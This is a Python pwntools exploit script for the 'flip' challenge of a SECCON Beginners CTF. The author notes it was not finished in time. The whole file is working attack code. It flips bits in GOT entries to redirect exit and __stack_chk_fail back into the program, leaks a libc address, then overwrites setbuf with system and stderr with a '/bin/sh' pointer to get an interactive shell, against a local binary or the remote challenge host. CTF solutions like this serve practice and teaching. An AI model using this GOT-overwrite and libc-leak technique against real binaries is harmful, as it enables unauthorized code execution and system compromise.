# cant solve on time


from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './flip'
HOST = 'flip.quals.beginners.seccon.jp'
PORT = 17539

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r = start()

def flip(addr, bit0, bit1):
    r.sendlineafter('address >> ', str(addr))
    r.sendlineafter(') >> ', str(bit0))
    r.sendlineafter(') >> ', str(bit1))

def flip_diff(addr, diff):
    val = diff
    for i in range(8):
        byte = (val >> (i*8)) & 0xff
        if byte == 0:
            return 
        for j in range(8): 
            if ((byte >> j) & 1) == 1:
                flip(addr+i, j, -1)

rdi = 0x4009e3


# 0x6d6 -> 0x6e6
flip(elf.got.exit, 5, 4) 

# 0x6e6 -> 0x6e0
flip(elf.got.exit, 1, 2) 

# __stack_chk_fail -> main
# 0x0x400676 -> 0x4007fa
flip(elf.got.__stack_chk_fail, 3, 2) 
flip(elf.got.__stack_chk_fail, 7, -1) 
flip(elf.got.__stack_chk_fail+1, -1, 0) 

# got.exit -> got.stack_chk_fail
# 0x6e0 -> 0x670
flip(elf.got.exit, 4, 7) 

# got.setbuf -> puts (diff:0x8d10) might fail
flip(elf.got.setbuf, -1, 4) 
flip(elf.got.setbuf+1, 0, 2) 
flip(elf.got.setbuf+1, 3, 7) 

# got.exit -> _start
# 0x670 -> 0x6e0
flip(elf.got.exit, 4, 7) 

# stderr -> +8
flip(0x6010a0, 4, -1) 

r.recvuntil('Done!\n')
r.recvuntil('\n')
leak = u64(r.recvuntil('\n')[:-1] + '\x00' * 2)
dbg("leak")
base = leak - 0x3ec703
system = base + 0x4f440
binsh = base + 0x1b3e9a
puts = base + 0x809c0
stderr = base + 0x3ec690

# got.exit -> got.stack_chk_fail
# 0x6e0 -> 0x670
flip(elf.got.exit, 4, 7) 

# got.setbuf -> system
flip_diff(elf.got.setbuf, puts ^ system)

# stderr -> binsh
flip_diff(0x6010a0, stderr ^ binsh)

if args.D:
    debug(r, [0x90c])

# got.exit -> _start
# 0x670 -> 0x6e0
flip(elf.got.exit, 4, 7) 


r.interactive()
r.close()
